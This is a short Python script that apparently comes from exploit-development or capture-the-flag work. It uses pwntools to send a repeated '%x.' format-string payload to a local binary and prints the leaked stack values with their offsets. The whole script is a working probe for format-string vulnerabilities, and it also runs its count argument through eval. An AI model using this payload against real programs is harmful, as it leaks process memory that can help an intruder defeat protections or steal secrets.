#!/usr/bin/python
from pwn import *
from sys import *
p = process(argv[1])
fs = "%x." * eval(argv[2])
p.sendline(fs)
a = p.read().split('.')
for i in range(len(a)):
    if not i % 4:
        print("\n<+%02d>"%i),
    print("%8s"%a[i]),

